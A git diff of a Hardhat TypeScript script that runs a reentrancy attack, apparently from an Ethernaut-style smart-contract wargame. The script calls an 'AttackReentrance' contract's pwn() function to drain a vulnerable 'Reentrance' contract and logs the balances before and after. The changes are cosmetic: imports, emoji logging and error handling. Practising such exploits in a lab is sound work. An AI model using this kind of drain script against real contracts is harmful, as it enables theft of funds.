@@ -1,7 +1,6 @@
 import { deployments, ethers } from "hardhat";
-import { BigNumber, Contract } from "ethers";
-import { Address, Deployment } from "hardhat-deploy/types";
-import { AttackKing, AttackReentrance, King, Reentrance } from "../typechain-types";
+import { Deployment } from "hardhat-deploy/types";
+import { AttackReentrance, Reentrance } from "../typechain-types";
 
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -11,13 +10,14 @@ const main = async (): Promise<void> => {
   const attackReentranceDeployment: Deployment = await deployments.get("AttackReentrance");
   const attackReentrance: AttackReentrance = await ethers.getContractAt("AttackReentrance", attackReentranceDeployment.address);
 
-  console.log(`Reentrance balance: ${await ethers.provider.getBalance(reentrance.address)}`);
+  console.log(`💰 Reentrance balance: ${await ethers.provider.getBalance(reentrance.address)}`);
   await attackReentrance.pwn({
     gasLimit: 500000
   });
-  console.log(await reentrance.balanceOf(attackReentrance.address))
-  console.log(`Reentrance balance Post: ${await ethers.provider.getBalance(reentrance.address)}`);
-
+  console.log(`💼 Attack balance: ${await reentrance.balanceOf(attackReentrance.address)}`)
+  console.log(`💰 Reentrance balance Post-Attack: ${await ethers.provider.getBalance(reentrance.address)}`);
 };
 
-main();
+main().catch(error => {
+  console.error('🚫', error);
+});
